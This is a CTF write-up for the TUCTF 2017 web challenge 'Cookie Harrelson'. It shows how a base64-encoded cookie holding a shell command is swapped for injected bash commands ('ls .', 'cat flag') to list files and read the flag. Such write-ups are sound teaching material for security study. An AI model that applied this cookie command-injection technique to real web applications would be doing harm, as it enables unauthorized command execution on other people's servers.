<h1>TUCTF 2017 â€“ Cookie Harrelson</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 200</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Woody Harrelson has decided to take up web dev after learning about Cookies. Show him that he should go back to killing zombies.</p>
  
  <p><a href="http://cookieharrelson.tuctf.com">http://cookieharrelson.tuctf.com</a></p>
</blockquote>

<h2>Solution</h2>

<p>Analyzing the cookies you can find the following:</p>

<p><code>
tallahassee : Y2F0IGluZGV4LnR4dA%3D%3D
</code></p>

<p>This cookie is base64 encoded:</p>

<p><code>
Y2F0IGluZGV4LnR4dA==
</code></p>

<p>Decoding it:</p>

<p><code>
cat index.txt
</code></p>

<p>Trying a command injection via the cookie will generate Base64 cookies in the following format:</p>

<p><code>
cat index.txt #ls
</code></p>

<p>So, trying to inject the Base64 version of this snippet:</p>

<p><code>
!/bin/bash
ls .
</code></p>

<p>Will enumerate the folder content, showing the presence of a "flag" file.
Trying to print the "flag" file with the following script (encoded via Base64 and passed into the cookie):</p>

<p><code>
!/bin/bash
cat flag
</code></p>

<p>Will show the flag:</p>

<p><code>
TUCTF{D0nt_3x3cut3_Fr0m_C00k13s}
</code></p>
